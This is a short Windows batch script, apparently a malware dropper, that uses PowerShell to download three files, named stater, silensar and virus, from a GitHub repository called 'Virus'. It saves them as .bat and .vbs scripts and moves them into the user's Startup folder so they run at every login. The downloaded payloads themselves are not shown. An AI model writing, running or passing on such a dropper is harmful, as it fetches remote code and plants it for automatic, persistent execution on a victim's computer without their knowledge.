@echo off
cls
:: First download a file.
Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/stater.txt' -OutFile stater.bat"
Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/silensar.txt' -OutFile silensar.vbs"
Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/virus.txt' -OutFile virus.bat"

:: Copy all files in destination.
move /y "stater.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\stater.bat"
move /y "silensar.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\silensar.vbs"
move /y "virus.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\virus.bat"
pause

exit